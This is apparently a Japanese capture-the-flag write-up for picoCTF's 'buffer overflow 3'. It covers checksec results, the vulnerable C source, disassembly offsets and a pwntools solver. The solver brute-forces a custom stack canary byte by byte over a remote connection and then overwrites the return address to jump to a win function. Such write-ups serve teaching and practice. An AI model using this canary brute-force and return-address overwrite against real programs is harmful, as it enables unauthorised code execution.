# buffer over flow3
## checksec
```
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```
shellcode以外は結構何でもできそう

## read_canary 
```c
char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    fflush(stdout);
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}
```

カナリアをテキストで用意して読む

## vuln
```c
void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}
```

BoFが`buf`にありそうだが、自前のカナリアがある。

## Hints
問題文のヒントに以下の記述がある。
> Maybe there's a smart way to brute-force the canary?

ブルートフォースしていいらしい。まあ32bitならできなくはないか...?

## disasm
```asm
   0x08049531 <+168>:   add    esp,0x10
   0x08049534 <+171>:   mov    eax,DWORD PTR [ebp-0x94]
   0x0804953a <+177>:   sub    esp,0x4
   0x0804953d <+180>:   push   eax
   0x0804953e <+181>:   lea    eax,[ebp-0x50]
   0x08049541 <+184>:   push   eax
   0x08049542 <+185>:   push   0x0
   0x08049544 <+187>:   call   0x8049130 <read@plt>
   0x08049549 <+192>:   add    esp,0x10
   0x0804954c <+195>:   sub    esp,0x4
   0x0804954f <+198>:   push   0x4
   0x08049551 <+200>:   mov    eax,0x804c054
   0x08049557 <+206>:   push   eax
   0x08049558 <+207>:   lea    eax,[ebp-0x10]
   0x0804955b <+210>:   push   eax
   0x0804955c <+211>:   call   0x8049180 <memcmp@plt>
```

`buf`は`ebp-0x50`
`canary`は`ebp-0x10`

## solver
雑にかく
カナリアを全探索するのは現実的ではないため、一文字ずつ探索する
書き込み範囲をこちらで指定できるのでこのようなことができる
```python
from pwn import *
import struct
import time


elf = ELF("./vuln")
win = elf.symbols["win"]
print(hex(win))

canary = 0x00000000

# local test canary
# canary = 0x30303031
print(struct.pack(">I", canary))

offset = 0x50 + 8
offset_to_canary = 0x50 - 0x10
payload = b"A" * offset_to_canary
print(payload)

for j in range(4):
    for i in range(256):
        # io = process("./vuln")
        io = remote("saturn.picoctf.net", 59038)

        io.recvuntil("How Many Bytes will You Write Into the Buffer?\n> ")
        io.sendline(str(int(offset_to_canary + j + 1)))

        io.recvuntil("Input> ")
        io.sendline(payload + struct.pack("<I", canary) + b"A" * 16 + p32(win))
        res = io.recvall()
        if b"**" not in res:
            print("Found canary: ", hex(canary))
            print(res)
            break
        else:
            canary += 1 << (8 * j)
            print("failed: ", hex(canary))
            time.sleep(0.1)

io = remote("saturn.picoctf.net", 59038)
io.recvuntil("How Many Bytes will You Write Into the Buffer?\n> ")
io.sendline(str(offset))
io.recvuntil("Input> ")
io.sendline(payload + struct.pack("<I", canary) + b"A" * 16 + p32(win))
print(io.recvall())
```

